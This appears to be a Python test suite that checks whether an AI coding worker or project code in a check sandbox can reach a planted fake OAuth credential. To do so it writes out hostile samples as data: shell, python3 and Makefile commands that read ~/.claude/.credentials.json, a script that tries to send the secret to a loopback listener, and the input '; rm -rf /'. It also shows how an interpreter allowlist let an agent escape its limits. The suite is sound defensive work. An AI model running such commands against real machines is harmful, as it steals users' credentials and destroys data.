"""Can worker-invoked code reach the provider credential? Asked by trying.

Every test here plants a **fake sentinel** first, proves it is really there and
really readable by something, and only then proves the boundary excludes it. A
test that merely asserts an absence passes just as happily against an empty
fixture, and none of these do that.

No real token is used anywhere in this file, and nothing is transmitted off this
machine — the network test uses a loopback listener started by the test itself.

The history worth keeping
-------------------------

PR1e's first design gave the worker Bash under a command-prefix allowlist and
described ``python3``/``pytest``/``make`` as bounded. The tests in
:class:`TheOriginalDesignWasExploitable` reproduce what that actually allowed,
against the same shape of sandbox, so the regression is a failing test rather
than a paragraph somebody has to believe.
"""

from __future__ import annotations

import os
import socket
import subprocess
import threading
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory

from cofferdam.workstation.tasks.adapters.claude_code_worker import cli
from cofferdam.workstation.worker import checks, sandbox

SENTINEL = "SENTINEL-CRED-DO-NOT-EXFILTRATE-9Q7X"
CREDENTIAL_BODY = (
    '{"claudeAiOauth":{"accessToken":"' + SENTINEL + '","refreshToken":"R-4K2"}}'
)


def bwrap_missing() -> bool:
    return not sandbox.available()[0]


class SentinelHarness(unittest.TestCase):
    """A worker home holding a fake credential, and a worktree beside it."""

    def setUp(self):
        if bwrap_missing():  # pragma: no cover - host dependent
            self.skipTest("bubblewrap is not installed")
        self._tmp = TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.dir = Path(self._tmp.name)

        self.home = self.dir / "home"
        (self.home / ".claude").mkdir(parents=True)
        self.credential = self.home / ".claude" / ".credentials.json"
        self.credential.write_text(CREDENTIAL_BODY, encoding="utf-8")
        os.chmod(self.credential, 0o600)

        self.work = self.dir / "work"
        self.work.mkdir()
        (self.work / "calc.py").write_text("def add(a, b):\n    return a + b\n")

    def test_the_sentinel_fixture_is_real(self):
        """If this fails, every exclusion test below is meaningless."""
        self.assertTrue(self.credential.is_file())
        self.assertIn(SENTINEL, self.credential.read_text())
        # And it is readable by an ordinary process on this host.
        self.assertIn(
            SENTINEL,
            subprocess.run(
                ["cat", str(self.credential)], capture_output=True, text=True
            ).stdout,
        )


class TheOriginalDesignWasExploitable(SentinelHarness):
    """What a credential-carrying namespace with a shell actually permitted.

    These are not hypotheticals. They run, and they demonstrate why the shipped
    profile no longer grants a command tool.
    """

    def run_in_claude_style_namespace(self, script: str) -> str:
        """A namespace shaped like the Claude phase: credential present, network on."""
        argv = [
            "bwrap", "--unshare-user", "--unshare-pid", "--die-with-parent",
            "--ro-bind", "/usr", "/usr", "--ro-bind", "/etc", "/etc",
            "--symlink", "usr/lib", "/lib", "--symlink", "usr/lib64", "/lib64",
            "--symlink", "usr/bin", "/bin",
            "--proc", "/proc", "--dev", "/dev", "--tmpfs", "/tmp",
            "--bind", str(self.home), "/home/worker",
            "--bind", str(self.work), "/work", "--chdir", "/work",
            "--setenv", "HOME", "/home/worker",
            "--setenv", "PATH", "/usr/bin:/bin",
            "/bin/sh", "-c", script,
        ]
        result = subprocess.run(argv, capture_output=True, text=True, timeout=60)
        return (result.stdout or "") + (result.stderr or "")

    def test_a_shell_could_read_the_credential(self):
        output = self.run_in_claude_style_namespace(
            'cat "$HOME/.claude/.credentials.json"'
        )
        self.assertIn(SENTINEL, output, "the fixture is not wired up")

    def test_an_allowed_python3_prefix_could_read_it(self):
        """`Bash(python3 *)` was on the original allowlist."""
        output = self.run_in_claude_style_namespace(
            'python3 -c \'import os;print(open(os.environ["HOME"]+"/.claude/.credentials.json").read())\''
        )
        self.assertIn(
            SENTINEL, output, "python3 is an arbitrary-code launcher, not a bounded command"
        )

    def test_project_controlled_code_could_read_it(self):
        """A Makefile lives in the repository the model just edited."""
        (self.work / "Makefile").write_text(
            "leak:\n\t@python3 -c 'import os;print(open(os.environ[\"HOME\"]"
            "+\"/.claude/.credentials.json\").read())'\n"
        )
        output = self.run_in_claude_style_namespace("make leak")
        self.assertIn(SENTINEL, output)


class TheShippedProfileGrantsNoCommandTool(SentinelHarness):
    """Layer one: with no command tool there is no process to read or send anything."""

    def granted(self):
        argv = cli.build_interior_argv(
            interior_cli="/opt/claude-cli", interior_worktree="/work"
        )
        return argv[argv.index("--allowedTools") + 1 : argv.index("--disallowedTools")]

    def test_no_command_tool_is_granted(self):
        for tool in self.granted():
            self.assertFalse(
                tool.startswith("Bash"),
                f"{tool} would put an arbitrary-code launcher in the credential namespace",
            )
        self.assertNotIn("Task", self.granted())

    def test_only_file_tools_are_granted(self):
        self.assertEqual(
            set(self.granted()), {"Read", "Write", "Edit", "Glob", "Grep", "TodoWrite"}
        )

    def test_command_tools_are_denied_by_name_as_well(self):
        argv = cli.build_interior_argv(
            interior_cli="/opt/claude-cli", interior_worktree="/work"
        )
        denied = argv[argv.index("--disallowedTools") + 1 :]
        for tool in ("Bash", "WebFetch", "WebSearch", "Task"):
            self.assertIn(tool, denied)

    def test_the_credential_directory_is_denied_to_file_tools(self):
        argv = cli.build_interior_argv(
            interior_cli="/opt/claude-cli", interior_worktree="/work"
        )
        denied = " ".join(argv[argv.index("--disallowedTools") + 1 :])
        for tool in ("Read", "Glob", "Grep"):
            self.assertIn(f"{tool}(/home/worker/**)", denied)

    def test_no_interpreter_appears_anywhere_as_a_grant(self):
        """The specific mistake: describing launchers as bounded commands."""
        argv = cli.build_interior_argv(
            interior_cli="/opt/claude-cli", interior_worktree="/work"
        )
        grants = " ".join(
            argv[argv.index("--allowedTools") + 1 : argv.index("--disallowedTools")]
        )
        for launcher in ("python", "pytest", "make", "npm", "sh", "bash", "git"):
            self.assertNotIn(launcher, grants)


class TheCheckSandboxHasNoCredential(SentinelHarness):
    """Layer two: project code runs where the credential is not mounted."""

    def test_the_plan_binds_only_the_worktree(self):
        argv = checks.build_plan(
            worktree=self.work, command=("python3", "-c", "print(1)")
        )
        bound = [
            argv[i + 1] for i, token in enumerate(argv) if token == "--bind"
        ]
        self.assertEqual(bound, [str(self.work.resolve())])

    def test_no_credential_path_is_in_the_plan(self):
        argv = checks.build_plan(worktree=self.work, command=("python3", "-c", "print(1)"))
        rendered = " ".join(argv)
        self.assertNotIn(str(self.home), rendered)
        self.assertNotIn(".claude", rendered)

    def test_project_code_in_the_check_sandbox_cannot_read_the_credential(self):
        """The sentinel exists on the host; the check sandbox cannot see it."""
        self.assertIn(SENTINEL, self.credential.read_text())

        (self.work / "leak.py").write_text(
            "import os\n"
            "for p in (os.path.expanduser('~/.claude/.credentials.json'),\n"
            f"          {str(self.credential)!r}):\n"
            "    try:\n"
            "        print('LEAKED', open(p).read())\n"
            "    except Exception as exc:\n"
            "        print('DENIED', type(exc).__name__)\n"
        )
        argv = checks.build_plan(worktree=self.work, command=("python3", "leak.py"))
        result = subprocess.run(argv, capture_output=True, text=True, timeout=60,
                                env={"PATH": "/usr/bin:/bin"})
        output = (result.stdout or "") + (result.stderr or "")
        self.assertNotIn(SENTINEL, output, "the check sandbox leaked the credential")
        self.assertIn("DENIED", output)

    def test_the_check_sandbox_has_no_home_with_secrets(self):
        argv = checks.build_plan(
            worktree=self.work,
            command=("python3", "-c", "import os;print('HOME=' + os.environ['HOME'])"),
        )
        result = subprocess.run(argv, capture_output=True, text=True, timeout=60,
                                env={"PATH": "/usr/bin:/bin"})
        self.assertIn("HOME=/tmp", result.stdout)

    def test_run_returns_a_result_for_a_passing_check(self):
        """Exercises `run()` end to end, not just `build_plan`.

        Added because the first version of this suite tested the *plan* and
        never the return path, so a rename that broke `CheckResult`'s
        construction passed every test here and only surfaced in the live smoke
        as an adapter TypeError.
        """
        (self.work / "test_ok.py").write_text(
            "import unittest\n\n\nclass T(unittest.TestCase):\n"
            "    def test_ok(self):\n        self.assertEqual(1, 1)\n"
        )
        result = checks.run(worktree=self.work)
        self.assertTrue(result.ran, result.failure)
        self.assertTrue(result.exit_zero, result.output)
        self.assertEqual(result.check, checks.DEFAULT_CHECK_ID)
        self.assertIn("exit_zero", result.to_dict())
        self.assertEqual(result.to_dict()["observed_by"], "cofferdam")

    def test_run_reports_a_failing_check_truthfully(self):
        (self.work / "test_bad.py").write_text(
            "import unittest\n\n\nclass T(unittest.TestCase):\n"
            "    def test_bad(self):\n        self.assertEqual(1, 2)\n"
        )
        result = checks.run(worktree=self.work)
        self.assertTrue(result.ran)
        self.assertFalse(result.exit_zero)

    def test_run_says_so_when_there_is_no_check(self):
        result = checks.run(worktree=self.work, check="none")
        self.assertFalse(result.ran)
        self.assertFalse(result.exit_zero)
        self.assertIsNotNone(result.failure)

    def test_a_check_result_never_claims_acceptance(self):
        """`exit_zero`, not `passed`. M2K owns the acceptance vocabulary."""
        result = checks.run(worktree=self.work, check="none")
        self.assertFalse(hasattr(result, "passed"))
        self.assertNotIn("passed", result.to_dict())

    def test_a_plan_carrying_a_credential_path_is_refused(self):
        """The assertion runs on every launch, not only here."""
        with self.assertRaises(checks.CheckUnavailable):
            checks.build_plan(
                worktree=self.work,
                command=("python3", "-c", "open('/x/.claude/credentials')"),
            )


class TheCheckSandboxHasNoNetwork(SentinelHarness):
    """Layer three: even if code had the secret, it has nowhere to send it."""

    def setUp(self):
        super().setUp()
        self.received = []
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind(("127.0.0.1", 0))
        self.server.listen(4)
        self.port = self.server.getsockname()[1]
        self.server.settimeout(15)

        def serve():
            while True:
                try:
                    connection, _ = self.server.accept()
                except OSError:
                    return
                with connection:
                    self.received.append(connection.recv(2048))

        self.thread = threading.Thread(target=serve, daemon=True)
        self.thread.start()
        self.addCleanup(self.server.close)

    def test_the_listener_really_receives_connections(self):
        """Prove the endpoint works before proving the sandbox cannot reach it."""
        with socket.create_connection(("127.0.0.1", self.port), 5) as connection:
            connection.sendall(b"HOST-PROBE")
        deadline = threading.Event()
        deadline.wait(1.0)
        self.assertTrue(
            any(b"HOST-PROBE" in item for item in self.received),
            "the listener is not working, so the isolation test would be vacuous",
        )

    def test_check_sandbox_code_cannot_reach_the_listener(self):
        with socket.create_connection(("127.0.0.1", self.port), 5) as connection:
            connection.sendall(b"HOST-PROBE")
        deadline = threading.Event()
        deadline.wait(1.0)
        self.assertTrue(any(b"HOST-PROBE" in item for item in self.received))
        before = len(self.received)

        (self.work / "exfil.py").write_text(
            "import socket\n"
            "try:\n"
            f"    s = socket.create_connection(('127.0.0.1', {self.port}), 3)\n"
            f"    s.sendall(b'EXFIL:{SENTINEL}')\n"
            "    s.close()\n"
            "    print('CONNECTED')\n"
            "except Exception as exc:\n"
            "    print('NO_NETWORK', type(exc).__name__)\n"
        )
        argv = checks.build_plan(worktree=self.work, command=("python3", "exfil.py"))
        result = subprocess.run(argv, capture_output=True, text=True, timeout=60,
                                env={"PATH": "/usr/bin:/bin"})
        output = (result.stdout or "") + (result.stderr or "")

        self.assertIn("NO_NETWORK", output, "the check sandbox reached the network")
        self.assertNotIn("CONNECTED", output)
        deadline.wait(1.0)
        self.assertEqual(len(self.received), before, "something arrived at the listener")
        for item in self.received:
            self.assertNotIn(SENTINEL.encode(), item)

    def test_the_plan_always_unshares_the_network(self):
        argv = checks.build_plan(worktree=self.work, command=("python3", "-c", "pass"))
        self.assertIn("--unshare-net", argv)


class OutputIsScrubbedBeforeItIsStored(unittest.TestCase):
    """The one channel a namespace cannot close: what the worker says."""

    def test_credential_shaped_text_is_redacted(self):
        from cofferdam.workstation.tasks.adapters.claude_code_worker.adapter import (
            _scrub,
        )

        for secret in (
            'my token is sk-ant-oat01-AbCdEf123456789',
            '{"accessToken": "' + SENTINEL + '"}',
            '{"refreshToken":"R-4K2XXXXXXXXXX"}',
        ):
            scrubbed = _scrub(secret)
            self.assertIn("[redacted]", scrubbed, secret)

    def test_ordinary_output_survives_scrubbing(self):
        from cofferdam.workstation.tasks.adapters.claude_code_worker.adapter import (
            _scrub,
        )

        text = "I added subtract() to calc.py and a test in test_calc.py."
        self.assertEqual(_scrub(text), text)


class ThePrefixAllowlistClaimIsCorrected(unittest.TestCase):
    """Documentation must not describe launchers as intrinsically bounded."""

    def test_the_profile_no_longer_claims_bounded_commands(self):
        source = Path(cli.__file__).read_text(encoding="utf-8")
        self.assertIn("arbitrary-code launchers", source)
        self.assertNotIn("BASH_ALLOWLIST", source)

    def test_the_check_table_excludes_repository_authored_commands(self):
        """`make` and `npm test` read their recipe from the worktree."""
        for command in checks.CHECK_COMMANDS.values():
            self.assertNotIn("make", command)
            self.assertNotIn("npm", command)

    def test_a_check_command_is_never_caller_text(self):
        with self.assertRaises(checks.CheckUnavailable):
            checks.resolve_check("python3 -c 'import os'")
        with self.assertRaises(checks.CheckUnavailable):
            checks.resolve_check("; rm -rf /")


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
